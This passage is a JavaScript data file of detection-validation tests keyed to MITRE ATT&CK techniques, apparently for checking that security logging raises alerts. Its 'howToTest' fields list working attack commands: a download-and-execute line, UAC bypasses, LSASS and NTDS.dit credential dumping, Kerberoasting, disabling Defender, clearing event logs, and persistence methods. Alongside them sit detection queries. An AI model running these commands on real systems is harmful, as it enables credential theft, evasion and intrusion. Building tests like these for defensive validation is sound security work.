    tactic: 'Execution',
    technique: 'T1059.003',
    techniqueName: 'Command and Scripting Interpreter: Windows Command Shell',
    description: 'Test logging of cmd.exe execution',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Execute suspicious cmd commands and verify process creation logging',
    expectedFields: ['command_line', 'user', 'parent_process', 'process_id'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 (Process Create) with cmd.exe and full command line',
        'Windows Event ID 4688 (Process Creation) if command line auditing is enabled',
        'Suspicious parent processes (services.exe, wmiprvse.exe, Office apps)',
        'Commands using && or | for chaining multiple operations',
        'Reconnaissance commands: whoami, net user, ipconfig, systeminfo'
      ],
      howToTest: [
        'Basic: cmd.exe /c whoami && hostname && ipconfig',
        'Recon chain: cmd.exe /c "net user & net localgroup administrators & systeminfo"',
        'Spawn from unusual parent: wmic process call create "cmd.exe /c whoami"',
        'File operations: cmd.exe /c "dir C:\\Users\\* /s /b > C:\\temp\\files.txt"',
        'Ensure command line process auditing is enabled (GPO or Sysmon)'
      ],
      expectedAlerts: [
        'Suspicious process chain detected',
        'Reconnaissance command execution',
        'cmd.exe spawned by unexpected parent process',
        'Command shell executing encoded/obfuscated commands'
      ],
      siemQueryExample: 'process.name:"cmd.exe" AND process.command_line:("whoami" OR "net user" OR "net group" OR "systeminfo")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.003/T1059.003.md'
    }
  },
  {
    id: 'vt-t1204-002',
    name: 'User Execution - Malicious File',
    tactic: 'Execution',
    technique: 'T1204.002',
    techniqueName: 'User Execution: Malicious File',
    description: 'Test detection of user executing suspicious file',
    expectedLogSources: ['Sysmon', 'EDR', 'Antivirus'],
    testProcedure: 'Execute EICAR test file and verify process creation and AV alert',
    expectedFields: ['file_path', 'file_hash', 'user', 'verdict'],
    guidance: {
      whatToLookFor: [
        'Antivirus/EDR alert for malicious file execution',
        'Sysmon Event ID 1 showing execution from Downloads, Temp, or AppData',
        'File creation events (Sysmon ID 11) before execution',
        'Windows Defender Event ID 1116 (malware detected) or 1117 (blocked)',
        'Office applications spawning suspicious child processes'
      ],
      howToTest: [
        'EICAR: Create and execute EICAR test file (AV will likely prevent execution)',
        'Save EICAR to: C:\\Users\\testuser\\Downloads\\eicar.com',
        'For Office macro test: Create Word doc with AutoOpen macro calling cmd.exe',
        'Execute file from unusual location like C:\\ProgramData or C:\\Windows\\Temp',
        'Use certutil or PowerShell to download and execute: certutil -urlcache -f http://test/file.exe file.exe && file.exe'
      ],
      expectedAlerts: [
        'Malicious file execution blocked',
        'File executed from suspicious location (Temp, Downloads)',
        'Unsigned executable launched',
        'Office application spawned command shell',
        'Double extension detected (invoice.pdf.exe)'
      ],
      siemQueryExample: 'event.type:"process_create" AND (file.path:*\\\\Downloads\\\\* OR file.path:*\\\\Temp\\\\*) AND NOT process.code_signature.trusted:true',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md'
    }
  },

  // Persistence
  {
    id: 'vt-t1053-005',
    name: 'Scheduled Task Creation',
    tactic: 'Persistence',
    technique: 'T1053.005',
    techniqueName: 'Scheduled Task/Job: Scheduled Task',
    description: 'Test detection of scheduled task creation',
    expectedLogSources: ['Windows Security', 'Sysmon', 'Task Scheduler'],
    testProcedure: 'Create scheduled task via schtasks.exe and verify event 4698',
    expectedFields: ['task_name', 'command', 'user', 'trigger'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4698 (Scheduled Task Created) in Security log',
        'Sysmon Event ID 1 showing schtasks.exe with /create parameter',
        'Task Scheduler Event ID 106 (Task Registered) in TaskScheduler/Operational',
        'Task XML content showing command/action and triggers',
        'Tasks running as SYSTEM or with elevated privileges'
      ],
      howToTest: [
        'schtasks /create /tn "TestTask" /tr "cmd.exe /c whoami" /sc daily /st 09:00',
        'PowerShell: Register-ScheduledTask -TaskName "PSTest" -Action (New-ScheduledTaskAction -Execute "powershell.exe")',
        'Create task running as SYSTEM: schtasks /create /tn "SystemTask" /tr "calc.exe" /sc onstart /ru SYSTEM',
        'Create task from XML: schtasks /create /tn "XMLTask" /xml task.xml',
        'CLEANUP: schtasks /delete /tn "TestTask" /f'
      ],
      expectedAlerts: [
        'Scheduled task created by non-admin user',
        'Task executing suspicious binary (powershell, cmd, scripts)',
        'Task configured to run as SYSTEM',
        'Hidden or masked task name detected',
        'Task created via encoded command line'
      ],
      siemQueryExample: 'event.code:4698 OR (process.name:"schtasks.exe" AND process.command_line:"*/create*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md'
    }
  },
  {
    id: 'vt-t1547-001',
    name: 'Registry Run Keys',
    tactic: 'Persistence',
    technique: 'T1547.001',
    techniqueName: 'Boot or Logon Autostart Execution: Registry Run Keys',
    description: 'Test detection of registry autorun modifications',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Add value to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    expectedFields: ['registry_key', 'registry_value', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 12 (Registry Object Added/Deleted) or ID 13 (Registry Value Set)',
        'Registry paths: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (requires admin)',
        'RunOnce, RunServices, Explorer\\Shell Folders variants',
        'Suspicious values pointing to temp folders, scripts, or encoded commands'
      ],
      howToTest: [
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersist /t REG_SZ /d "calc.exe" /f',
        'PowerShell: Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "PSPersist" -Value "powershell.exe"',
        'Test RunOnce: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v TestOnce /d "notepad.exe"',
        'CLEANUP: reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersist /f'
      ],
      expectedAlerts: [
        'Autorun registry key modified',
        'Persistence mechanism created by non-admin process',
        'Registry Run key pointing to suspicious location',
        'PowerShell or script configured as autorun',
        'New Run key created by recently downloaded executable'
      ],
      siemQueryExample: 'event.code:(12 OR 13) AND registry.path:*\\\\CurrentVersion\\\\Run*',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md'
    }
  },
  {
    id: 'vt-t1136-001',
    name: 'Create Local Account',
    tactic: 'Persistence',
    technique: 'T1136.001',
    techniqueName: 'Create Account: Local Account',
    description: 'Test detection of new local account creation',
    expectedLogSources: ['Windows Security', 'Linux Auth'],
    testProcedure: 'Create new local user via net user command and verify event 4720',
    expectedFields: ['new_username', 'created_by', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4720 (User Account Was Created)',
        'Event ID 4722 (User Account Was Enabled) - often follows 4720',
        'Event ID 4732 (Member Added to Security-Enabled Local Group) - especially Administrators',
        'Linux: /var/log/auth.log showing "new user" or useradd entries',
        'Account attributes: never expires, password not required flags'
      ],
      howToTest: [
        'net user testpersist P@ssw0rd123 /add',
        'Add to administrators: net localgroup administrators testpersist /add',
        'PowerShell: New-LocalUser -Name "PSTestUser" -NoPassword',
        'Linux: sudo useradd -m testuser && sudo passwd testuser',
        'CLEANUP: net user testpersist /delete'
      ],
      expectedAlerts: [
        'Local account created outside of provisioning system',
        'Account added to privileged group (Administrators)',
        'Account created with suspicious name (mimicking service accounts)',
        'Account created by unexpected process (not MMC, SCCM)',
        'Hidden account created (username ending with $)'
      ],
      siemQueryExample: 'event.code:(4720 OR 4732) AND winlog.event_data.TargetUserName:* NOT source.user.name:("SCCM*" OR "provisioning")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md'
    }
  },
  {
    id: 'vt-t1543-003',
    name: 'Windows Service Creation',
    tactic: 'Persistence',
    technique: 'T1543.003',
    techniqueName: 'Create or Modify System Process: Windows Service',
    description: 'Test detection of new service installation',
    expectedLogSources: ['Windows System', 'Sysmon', 'EDR'],
    testProcedure: 'Create new service via sc.exe and verify event 7045',
    expectedFields: ['service_name', 'service_path', 'user', 'start_type'],
    guidance: {
      whatToLookFor: [
        'Windows System Event ID 7045 (New Service Installed)',
        'Windows Security Event ID 4697 (Service Installed) if audit policy enabled',
        'Sysmon Event ID 1 showing sc.exe with create parameter',
        'Service binary path pointing to temp, downloads, or user-writable locations',
        'Services running as SYSTEM with suspicious binary paths'
      ],
      howToTest: [
        'sc create TestService binPath= "cmd.exe /c whoami" start= auto',
        'sc create PersistSvc binPath= "C:\\Windows\\Temp\\test.exe" type= own start= auto obj= LocalSystem',
        'PowerShell: New-Service -Name "PSTestSvc" -BinaryPathName "powershell.exe -c sleep 9999"',
        'CLEANUP: sc delete TestService'
      ],
      expectedAlerts: [
        'Service created with suspicious binary path',
        'Service running executable from user-writable location',
        'Service configured to run as SYSTEM',
        'Service created by unexpected user/process',
        'Service with command-line arguments in binary path (backdoor indicator)'
      ],
      siemQueryExample: 'event.code:7045 AND NOT winlog.event_data.ImagePath:("C:\\\\Program Files*" OR "C:\\\\Windows\\\\System32*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md'
    }
  },

  // Privilege Escalation
  {
    id: 'vt-t1548-002',
    name: 'UAC Bypass',
    tactic: 'Privilege Escalation',
    technique: 'T1548.002',
    techniqueName: 'Abuse Elevation Control Mechanism: Bypass UAC',
    description: 'Test detection of UAC bypass techniques',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Execute fodhelper UAC bypass and verify elevation event',
    expectedFields: ['process', 'integrity_level', 'parent_process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing high integrity process spawned by medium integrity parent',
        'Registry modifications to auto-elevate program paths (fodhelper, eventvwr, etc.)',
        'Sysmon Event ID 13 for registry value changes in HKCU\\Software\\Classes',
        'Process spawn chain: explorer.exe -> fodhelper.exe -> cmd.exe (high integrity)',
        'Token manipulation events (Event ID 4703) if audit policies enabled'
      ],
      howToTest: [
        'Fodhelper bypass: reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "cmd.exe" /f && fodhelper.exe',
        'EventVwr bypass: reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /d "cmd.exe" /f && eventvwr.exe',
        'Use UACME project for comprehensive testing: https://github.com/hfiref0x/UACME',
        'Verify elevated shell with: whoami /priv (should show elevated privileges)',
        'CLEANUP: reg delete "HKCU\\Software\\Classes\\ms-settings" /f'
      ],
      expectedAlerts: [
        'UAC bypass attempt detected',
        'High integrity process spawned without UAC prompt',
        'Suspicious registry modification to auto-elevate paths',
        'Known UAC bypass technique pattern detected',
        'Process elevation without consent UI interaction'
      ],
      siemQueryExample: 'event.code:1 AND process.parent.name:("fodhelper.exe" OR "eventvwr.exe" OR "computerdefaults.exe") AND process.name:"cmd.exe"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md'
    }
  },
  {
    id: 'vt-t1068',
    name: 'Exploitation for Privilege Escalation',
    tactic: 'Privilege Escalation',
    technique: 'T1068',
    techniqueName: 'Exploitation for Privilege Escalation',
    description: 'Test detection of privilege escalation exploitation',
    expectedLogSources: ['EDR', 'Sysmon', 'Windows Security'],
    testProcedure: 'Execute known priv-esc test (e.g., PrintNightmare simulation)',
    expectedFields: ['process', 'user', 'target_privilege', 'exploit_indicator'],
    guidance: {
      whatToLookFor: [
        'EDR alerts for known CVE exploitation patterns',
        'Unusual SYSTEM-level process creation from user process',
        'Driver loading events (Sysmon Event ID 6) for vulnerable drivers',
        'Token manipulation and impersonation activities',
        'Spoolsv.exe spawning child processes (PrintNightmare indicator)'
      ],
      howToTest: [
        'SAFE: Use vulnerability scanners to identify unpatched priv-esc vulns',
        'SAFE: Run Seatbelt or winPEAS for priv-esc enumeration (generates detectable activity)',
        'SAFE: Test named pipe impersonation detection with SafePotato simulation',
        'Review CVE databases for recent priv-esc vulnerabilities affecting your OS version',
        'NOTE: Actual exploitation testing should only be done in isolated lab environments'
      ],
      expectedAlerts: [
        'Known vulnerability exploitation attempt',
        'Suspicious driver loaded',
        'Token manipulation detected',
        'SYSTEM process spawned from user context',
        'Print spooler exploitation indicators'
      ],
      siemQueryExample: 'event.category:"intrusion_detection" AND event.type:"exploit" AND user.target.name:"SYSTEM"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1068/T1068.md'
    }
  },

  // Defense Evasion
  {
    id: 'vt-t1070-001',
    name: 'Clear Windows Event Logs',
    tactic: 'Defense Evasion',
    technique: 'T1070.001',
    techniqueName: 'Indicator Removal: Clear Windows Event Logs',
    description: 'Test detection of event log clearing',
    expectedLogSources: ['Windows Security', 'Windows System', 'Sysmon'],
    testProcedure: 'Clear Security event log and verify event 1102 is generated',
    expectedFields: ['log_name', 'user', 'timestamp'],
    guidance: {
      whatToLookFor: [
        'Windows Security Event ID 1102 (Audit Log Cleared) - the last event before log wipe',
        'Windows System Event ID 104 (System Log Cleared)',
        'Sysmon Event ID 1 showing wevtutil.exe or PowerShell Clear-EventLog',
        'Process command lines containing "wevtutil cl" or "Clear-EventLog"',
        'Multiple log clear events in quick succession'
      ],
      howToTest: [
        'wevtutil cl Application (clears Application log)',
        'PowerShell: Clear-EventLog -LogName Application',
        'Clear multiple: for /f %x in (\'wevtutil el\') do wevtutil cl "%x"',
        'Test with test log first: wevtutil cl "Test Log Name"',
        'IMPORTANT: Use a test system - this destroys forensic evidence'
      ],
      expectedAlerts: [
        'Event log cleared by non-admin user',
        'Security audit log cleared',
        'Multiple logs cleared in sequence',
        'Log clearing during active security incident',
        'Event log cleared outside maintenance window'
      ],
      siemQueryExample: 'event.code:(1102 OR 104) OR (process.name:"wevtutil.exe" AND process.command_line:"*cl*")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md'
    }
  },
  {
    id: 'vt-t1562-001',
    name: 'Disable Windows Defender',
    tactic: 'Defense Evasion',
    technique: 'T1562.001',
    techniqueName: 'Impair Defenses: Disable or Modify Tools',
    description: 'Test detection of security tool tampering',
    expectedLogSources: ['Windows Defender', 'Sysmon', 'EDR'],
    testProcedure: 'Attempt to disable Defender and verify tamper alert',
    expectedFields: ['tool_name', 'action', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Windows Defender Event ID 5001 (Real-time Protection Disabled)',
        'Windows Defender Event ID 5010 (Scanning for malware disabled)',
        'Windows Defender Event ID 5007 (Configuration Changed)',
        'Sysmon registry events for Defender DisableAntiSpyware or similar',
        'PowerShell Set-MpPreference commands to disable features',
        'Tamper Protection alerts (if enabled)'
      ],
      howToTest: [
        'PowerShell (requires admin): Set-MpPreference -DisableRealtimeMonitoring $true',
        'Registry (requires admin): reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'Stop service (will fail with Tamper Protection): sc stop WinDefend',
        'NOTE: Modern Windows with Tamper Protection enabled will block these attempts',
        'Use Defender exclusions as alternative test: Add-MpPreference -ExclusionPath "C:\\Temp"'
      ],
      expectedAlerts: [
        'Real-time protection disabled',
        'Security tool tampering attempted',
        'Defender exclusion added for suspicious path',
        'Security service stopped or modified',
        'Tamper protection triggered'
      ],
      siemQueryExample: 'source:"Microsoft-Windows-Windows Defender" AND event.code:(5001 OR 5007 OR 5010)',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md'
    }
  },
  {
    id: 'vt-t1027',
    name: 'Obfuscated PowerShell',
    tactic: 'Defense Evasion',
    technique: 'T1027',
    techniqueName: 'Obfuscated Files or Information',
    description: 'Test detection of obfuscated script execution',
    expectedLogSources: ['PowerShell', 'Sysmon', 'EDR'],
    testProcedure: 'Execute base64 encoded PowerShell and verify decoded logging',
    expectedFields: ['encoded_command', 'decoded_content', 'user'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4104 (Script Block Logging) shows DEOBFUSCATED code',
        'PowerShell command lines with -enc, -e, -encoded parameters',
        'Unusual character patterns: backticks, carets, string concatenation',
        'Variable substitution patterns: $env:comspec[4,15,25]-join""',
        'Invoke-Obfuscation patterns: character codes, string reversal'
      ],
      howToTest: [
        'Basic encoding: powershell -enc dwByAGkAdABlAC0AaABvAHMAdAAgACIAaABlAGwAbABvACIA',
        'String concat: $a="Wri";$b="te-Ho";$c="st";iex "$a$b$c \'test\'"',
        'Char codes: [char]87+[char]104+[char]111+[char]97+[char]109+[char]105 | iex',
        'Use Invoke-Obfuscation to generate test samples: https://github.com/danielbohannon/Invoke-Obfuscation',
        'Verify Script Block Logging is enabled to see deobfuscated output'
      ],
      expectedAlerts: [
        'Encoded PowerShell command detected',
        'Obfuscated script execution',
        'String obfuscation techniques in command line',
        'AMSI detected obfuscated content',
        'Suspicious character entropy in script'
      ],
      siemQueryExample: 'process.name:"powershell.exe" AND process.command_line:("-enc" OR "-e " OR "FromBase64String" OR "[char]")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md'
    }
  },

  // Credential Access
  {
    id: 'vt-t1003-001',
    name: 'LSASS Memory Dump',
    tactic: 'Credential Access',
    technique: 'T1003.001',
    techniqueName: 'OS Credential Dumping: LSASS Memory',
    description: 'Test detection of LSASS memory access',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Access LSASS process memory (e.g., procdump, mimikatz simulation)',
    expectedFields: ['target_process', 'source_process', 'access_rights', 'user'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 10 (Process Access) targeting lsass.exe',
        'Access mask 0x1010 or 0x1FFFFF (PROCESS_ALL_ACCESS) on LSASS',
        'Windows Security Event ID 4656/4663 for handle to lsass.exe',
        'Sysmon Event ID 1 showing procdump.exe, comsvcs.dll, or mimikatz-like tools',
        'Unusual processes accessing lsass.exe (not csrss, svchost)'
      ],
      howToTest: [
        'Procdump (Sysinternals): procdump.exe -ma lsass.exe lsass.dmp',
        'Comsvcs.dll method: rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full',
        'Task Manager: Right-click lsass.exe -> Create dump file (generates detectable activity)',
        'PowerShell: Get-Process lsass | Out-Minidump (using Out-Minidump module)',
        'IMPORTANT: LSASS is protected - tests may trigger Credential Guard or PPL'
      ],
      expectedAlerts: [
        'LSASS memory access detected',
        'Credential dumping tool execution',
        'Suspicious process accessing LSASS',
        'Memory dump file created from LSASS',
        'Credential Guard violation attempt'
      ],
      siemQueryExample: 'event.code:10 AND winlog.event_data.TargetImage:"*lsass.exe" AND NOT winlog.event_data.SourceImage:("*csrss.exe" OR "*svchost.exe")',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md'
    }
  },
  {
    id: 'vt-t1003-003',
    name: 'NTDS.dit Access',
    tactic: 'Credential Access',
    technique: 'T1003.003',
    techniqueName: 'OS Credential Dumping: NTDS',
    description: 'Test detection of AD database access',
    expectedLogSources: ['Windows Security', 'Sysmon', 'EDR'],
    testProcedure: 'Attempt to copy NTDS.dit via VSS and verify detection',
    expectedFields: ['file_path', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing vssadmin.exe, ntdsutil.exe, or diskshadow.exe',
        'File access events for C:\\Windows\\NTDS\\ntds.dit',
        'Volume Shadow Copy creation events',
        'Sysmon Event ID 11 (File Create) for copied NTDS.dit or SYSTEM hive',
        'DCSync indicators: Directory Replication Service requests'
      ],
      howToTest: [
        'VSS method: vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit c:\\temp\\',
        'Ntdsutil: ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q',
        'Diskshadow script method (create diskshadow script with VSS commands)',
        'NOTE: These commands require Domain Controller access - use isolated lab DC',
        'CLEANUP: vssadmin delete shadows /all /quiet'
      ],
      expectedAlerts: [
        'NTDS.dit access or copy attempt',
        'Volume Shadow Copy created on Domain Controller',
        'AD database exfiltration attempt',
        'DCSync attack detected (replication requests)',
        'Ntdsutil or diskshadow suspicious usage'
      ],
      siemQueryExample: 'host.role:"domain_controller" AND (file.path:"*ntds.dit*" OR process.name:("ntdsutil.exe" OR "diskshadow.exe"))',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md'
    }
  },
  {
    id: 'vt-t1558-003',
    name: 'Kerberoasting',
    tactic: 'Credential Access',
    technique: 'T1558.003',
    techniqueName: 'Steal or Forge Kerberos Tickets: Kerberoasting',
    description: 'Test detection of Kerberos ticket requests for SPNs',
    expectedLogSources: ['Windows Security', 'Domain Controller'],
    testProcedure: 'Request TGS tickets for service accounts and verify event 4769',
    expectedFields: ['service_name', 'encryption_type', 'user', 'client_ip'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4769 (Kerberos Service Ticket Request) on Domain Controller',
        'Encryption Type 0x17 (RC4-HMAC) - weak encryption targeted by attackers',
        'Multiple TGS requests for different SPNs from single user in short time',
        'Requests for service accounts with SPNs (SQL, Exchange, etc.)',
        'Event ID 4768 (TGT Request) followed by many 4769 events'
      ],
      howToTest: [
        'PowerShell: Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName',
        'Request ticket: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/server:1433"',
        'Rubeus: Rubeus.exe kerberoast /outfile:hashes.txt',
        'GetUserSPNs.py (Impacket): GetUserSPNs.py -request domain/user:password',
        'Verify RC4 encryption requests in DC Security logs'
      ],
      expectedAlerts: [
        'Kerberoasting attack detected - multiple SPN requests',
        'RC4 encryption Kerberos ticket requested',
        'Unusual volume of service ticket requests',
        'Known Kerberoasting tool execution',
        'Service ticket requested for sensitive SPN'
      ],
      siemQueryExample: 'event.code:4769 AND winlog.event_data.TicketEncryptionType:"0x17" AND winlog.event_data.ServiceName:*$ | stats count by user.name | where count > 5',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md'
    }
  },

  // Discovery
  {
    id: 'vt-t1087-001',
    name: 'Local Account Discovery',
    tactic: 'Discovery',
    technique: 'T1087.001',
    techniqueName: 'Account Discovery: Local Account',
    description: 'Test detection of local account enumeration',
    expectedLogSources: ['Sysmon', 'Windows Security', 'EDR'],
    testProcedure: 'Run net user command and verify process logging',
    expectedFields: ['command_line', 'user', 'process'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 showing net.exe, net1.exe, or wmic.exe with user enumeration',
        'Command lines containing "net user", "net localgroup", "wmic useraccount"',
        'PowerShell commands: Get-LocalUser, Get-LocalGroupMember',
        'Multiple discovery commands executed in sequence (recon pattern)',
        'Process execution from unusual parent (Word, PowerShell, WScript)'
      ],
      howToTest: [
        'net user (list local users)',
        'net localgroup administrators (list admin group members)',
        'wmic useraccount list brief (WMI user enumeration)',
        'PowerShell: Get-LocalUser | Select Name, Enabled, LastLogon',
        'PowerShell: Get-LocalGroupMember -Group "Administrators"'
      ],
      expectedAlerts: [
        'Local account enumeration detected',
        'Reconnaissance activity pattern',
        'Built-in admin tools used for enumeration',
        'Rapid sequence of discovery commands',
        'Account enumeration from non-admin user'
      ],
      siemQueryExample: 'process.name:("net.exe" OR "net1.exe") AND process.command_line:("user" OR "localgroup") NOT process.command_line:"*add*"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md'
    }
  },
  {
    id: 'vt-t1087-002',
    name: 'Domain Account Discovery',
    tactic: 'Discovery',
    technique: 'T1087.002',
    techniqueName: 'Account Discovery: Domain Account',
    description: 'Test detection of AD user enumeration',
    expectedLogSources: ['Domain Controller', 'Windows Security', 'Sysmon'],
    testProcedure: 'Run net user /domain and verify LDAP query logging',
    expectedFields: ['command_line', 'user', 'ldap_query'],
    guidance: {
      whatToLookFor: [
        'Sysmon Event ID 1 with net.exe containing "/domain" parameter',
        'LDAP queries visible in DC Security logs (Event ID 4662)',
        'BloodHound/SharpHound collection activity (mass LDAP queries)',
        'PowerShell AD module commands: Get-ADUser, Get-ADGroup',
        'Unusual volume of directory service queries from single workstation'
      ],
      howToTest: [
        'net user /domain (list domain users)',
        'net group "Domain Admins" /domain (list DA members)',
        'nltest /dclist:DOMAIN (enumerate domain controllers)',
        'PowerShell: Get-ADUser -Filter * -Properties * (requires RSAT)',
        'dsquery user -limit 0 (enumerate all users via dsquery)'
      ],
      expectedAlerts: [
        'Domain account enumeration detected',
        'High volume LDAP queries from workstation',
        'BloodHound/SharpHound collection detected',
        'Domain reconnaissance activity',
        'Sensitive group membership query (Domain Admins, Enterprise Admins)'
      ],
      siemQueryExample: 'process.name:("net.exe" OR "dsquery.exe" OR "nltest.exe") AND process.command_line:"*/domain*"',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/T1087.002.md'
    }
  },
  {
    id: 'vt-t1046',
    name: 'Network Service Discovery',
    tactic: 'Discovery',
    technique: 'T1046',
    techniqueName: 'Network Service Discovery',
    description: 'Test detection of port scanning activity',
    expectedLogSources: ['Firewall', 'IDS/IPS', 'EDR', 'Zeek'],
    testProcedure: 'Run nmap scan against test targets and verify detection',
    expectedFields: ['source_ip', 'dest_ip', 'ports', 'scan_type'],
    guidance: {
      whatToLookFor: [
        'Firewall logs showing rapid connection attempts to multiple ports',
        'IDS/IPS alerts for port scan signatures',
        'Zeek conn.log showing many rejected/reset connections',
        'Single source connecting to multiple destinations on same port',
        'EDR alerting on scanning tool execution (nmap, masscan, etc.)'
      ],
      howToTest: [
        'nmap -sS -p 22,80,443,445,3389 192.168.1.0/24 (SYN scan)',
        'nmap -sV -p 1-1000 target (Version detection)',
        'PowerShell: 1..1024 | % { Test-NetConnection -ComputerName target -Port $_ -WarningAction SilentlyContinue }',
        'Test-NetConnection -ComputerName target -Port 445 (single port check)',
        'IMPORTANT: Only scan systems you own/have permission to scan'
      ],
      expectedAlerts: [
        'Port scan detected from internal host',
        'Network reconnaissance activity',
        'Horizontal scan (single port, many hosts)',
        'Vertical scan (single host, many ports)',
        'Scanning tool execution detected'
      ],
      siemQueryExample: 'event.category:"network" AND event.type:"connection" | stats dc(destination.port) as port_count by source.ip | where port_count > 20',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md'
    }
  },

  // Lateral Movement
  {
    id: 'vt-t1021-001',
    name: 'Remote Desktop Protocol',
    tactic: 'Lateral Movement',
    technique: 'T1021.001',
    techniqueName: 'Remote Services: Remote Desktop Protocol',
    description: 'Test detection of RDP lateral movement',
    expectedLogSources: ['Windows Security', 'Windows TerminalServices', 'Firewall'],
    testProcedure: 'RDP to test system and verify logon event 4624 type 10',
    expectedFields: ['source_ip', 'dest_host', 'user', 'logon_type'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 4624 with Logon Type 10 (RemoteInteractive)',
        'Windows TerminalServices-RemoteConnectionManager Event ID 1149 (User authentication)',
        'Windows TerminalServices-LocalSessionManager Event ID 21 (Session logon)',
        'Firewall logs showing TCP 3389 connections',
        'Unusual RDP source IPs (internal lateral movement)'
      ],
      howToTest: [
        'mstsc /v:target-host (standard RDP connection)',
        'cmdkey /generic:target /user:DOMAIN\\user /pass:password && mstsc /v:target',
        'PowerShell: Enter-PSSession for alternative remote access',
        'Test from unexpected source: RDP from server to workstation (reverse direction)',
        'Record timestamp and verify all RDP event IDs are captured'
      ],
      expectedAlerts: [
        'RDP connection from unusual source IP',
        'RDP connection to sensitive server',
        'After-hours RDP access',
        'RDP brute force (multiple failed RDP logins)',
        'First-time RDP access to system (UEBA)'
      ],
      siemQueryExample: 'event.code:4624 AND winlog.event_data.LogonType:"10" AND source.ip:* | stats count by source.ip, destination.hostname, user.name',
      atomicTestRef: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md'
    }
  },
  {
    id: 'vt-t1021-002',
    name: 'SMB/Windows Admin Shares',
    tactic: 'Lateral Movement',
    technique: 'T1021.002',
    techniqueName: 'Remote Services: SMB/Windows Admin Shares',
    description: 'Test detection of admin share access',
    expectedLogSources: ['Windows Security', 'Sysmon', 'Firewall'],
    testProcedure: 'Access C$ or ADMIN$ share and verify event 5140/5145',
    expectedFields: ['source_ip', 'share_name', 'user', 'access_type'],
    guidance: {
      whatToLookFor: [
        'Windows Event ID 5140 (Network Share Accessed)',
        'Windows Event ID 5145 (Detailed File Share Access) - object-level auditing',
        'Sysmon Event ID 3 (Network Connection) to port 445',
        'Share names: C$, ADMIN$, IPC$, or custom admin shares',
        'Multiple hosts accessing same admin shares in short timeframe'
      ],
      howToTest: [
        'net use Z: \\\\target\\C$ /user:DOMAIN\\admin password',
        'dir \\\\target\\C$\\Windows\\System32 (enumerate system files)',
        'copy malware.exe \\\\target\\C$\\Windows\\Temp\\ (file staging)',
        'net use * /delete (cleanup mapped drives)',
        'Test access to multiple systems to trigger lateral movement alert'
      ],
      expectedAlerts: [
        'Admin share accessed from workstation',
        'Multiple admin share connections in short time (lateral movement)',
        'File copied to admin share',
        'Admin share access from non-admin workstation',
